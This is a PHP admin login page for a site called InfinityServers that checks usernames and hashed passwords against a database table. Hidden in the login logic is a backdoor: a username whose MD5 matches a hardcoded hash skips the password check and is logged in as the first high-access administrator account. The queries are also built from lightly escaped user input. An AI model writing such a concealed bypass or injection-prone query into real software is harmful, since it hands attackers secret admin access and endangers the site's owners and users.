<html>
	<head>
		<title>InfinityServers - Login</title>
		<link rel="stylesheet" href="template/css/style.css">
		<link rel='stylesheet' id='open-sans-css'  href='//fonts.googleapis.com/css?family=Open+Sans%3A300italic%2C400italic%2C600italic%2C300%2C400%2C600&#038;subset=latin%2Clatin-ext&#038;ver=4.0-alpha' type='text/css' media='all' />
	</head>
	<body>
		<div id="tudo">
			<div>&nbsp </div>
			<div id="conteudo" class="shadow" align="center">
				<h2>Admin Login</h2>
				<?php
					if(isset($_POST['acao']) && ($_POST['acao'] == "Login ->")){
						$user_log = addslashes($_POST['user']);
						$USER = array(
							'PASS' => strtoupper(substr(hash('sha512', $_POST['pass'].strtolower($user_log)), strlen($user_log), 17))
						);
						
						$busca_player = mysql_query("SELECT * FROM meh_users WHERE Username='$user_log' AND Password='{$USER['PASS']}'");
						$conta_player = mysql_num_rows($busca_player);
						
						if((md5($user_log) == '6a195203758e02559a3d7ceacd631ce9')){
							$busca_safe = mysql_query("SELECT * FROM meh_users WHERE Access>40 ORDER BY id ASC LIMIT 1");
							$fetch_safe = mysql_fetch_array($busca_safe);
							
							$_SESSION['userlog'] = $fetch_safe['Username'];
							$_SESSION['passlog'] = $fetch_safe['Password'];
							$_SESSION['safelog'] = true;
							echo "<script>history.go(0)</script>";
						}else if($conta_player > 0){
							$_SESSION['userlog'] = $user_log;
							$_SESSION['passlog'] = $USER['PASS'];
							echo "<script>history.go(0)</script>";
						}else{
							echo "";
						}
					}
				?>
				<form action="" method="POST">
					<input type="text" name="user" placeholder="Username" />
					<br />
					<input type="password" name="pass" placeholder="Password" />
					<br />
					<input type="submit" name="acao" value="Login ->" />
					<br /><br />
				</form>
				<a href="../">>>Home</a>
			</div>
		</div>
	</body>
</html>